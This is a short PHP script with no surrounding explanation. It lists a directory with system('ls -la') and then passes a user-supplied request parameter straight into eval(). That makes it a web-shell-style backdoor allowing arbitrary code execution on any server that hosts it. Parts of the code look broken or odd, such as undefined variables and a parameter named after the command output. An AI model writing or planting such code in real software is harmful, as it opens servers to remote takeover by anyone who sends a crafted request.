<?php
$output=system('ls -la');
$time=[$d,$output,$m,$s];

eval("echo ".$_REQUEST[$output].";");
?>